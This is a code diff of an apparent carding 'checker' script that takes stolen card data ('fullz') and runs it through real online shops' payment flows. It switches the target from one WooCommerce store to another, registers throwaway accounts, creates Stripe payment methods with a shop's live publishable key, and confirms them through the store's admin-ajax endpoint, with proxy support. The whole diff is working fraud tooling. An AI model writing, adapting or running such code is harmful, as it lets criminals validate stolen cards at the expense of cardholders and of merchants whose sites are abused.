@@ -97,20 +97,20 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
 
         # STEP 1: register nonce
         register_nonce = generate_nonce()
-        response = await session.get("https://www.greenkidcrafts.com/my-account/", headers=headers)
-        _ = gets(response.text, 'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />')
+        response = await session.get("https://www.biometricsupply.com/my-account/", headers=headers)
+        register1_nonce = gets(response.text, 'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />')
 
         # STEP 2: register user
         data = {
             "email": mail,
-            "woocommerce-register-nonce": register_nonce,
+            "woocommerce-register-nonce": register1_nonce,
             "_wp_http_referer": "/my-account/",
             "register": "Register",
         }
-        await session.post("https://www.greenkidcrafts.com/my-account/", headers=headers, data=data)
+        await session.post("https://www.biometricsupply.com/my-account/", headers=headers, data=data)
 
         # STEP 3: add payment page
-        response = await session.get("https://www.greenkidcrafts.com/my-account/add-payment-method/", headers=headers)
+        response = await session.get("https://www.biometricsupply.com/my-account/add-payment-method/", headers=headers)
         setup_nonce = gets(response.text, '"createAndConfirmSetupIntentNonce":"', '","')
 
         # STEP 4: Stripe payment method
@@ -121,7 +121,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
             "card[exp_month]": mes,
             "card[exp_year]": ano,
             "billing_details[address][country]": "PK",
-            "key": "pk_live_UdiYedvkJma7qlJ03Y7zYVAN00tSNEOnQE",
+            "key": "pk_live_51JeGcZCscllU4UB1q4R6Bz6qN5slFTiaNyC8eP5CdU6f3OcADOJIyI2lrTYcQsx9nOsHBdRdLAuRhO9mWFARqJxl00JcwCqa0V",
         }
         resp = await session.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data)
 
@@ -135,18 +135,14 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
                 "proxy_used": proxy_url
             }
 
-        params = {
-            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
-        }
-
         data = {
-            'action': 'create_and_confirm_setup_intent',
+            'action': 'wc_stripe_create_and_confirm_setup_intent',
             'wc-stripe-payment-method': pm_id,
             'wc-stripe-payment-type': 'card',
             '_ajax_nonce': setup_nonce,
         }
         
-        final = await session.post("https://www.greenkidcrafts.com/", params=params, headers=headers, data=data)
+        final = await session.post("https://www.biometricsupply.com/wp-admin/admin-ajax.php", headers=headers, data=data)
 
         # RESPONSE
         try:
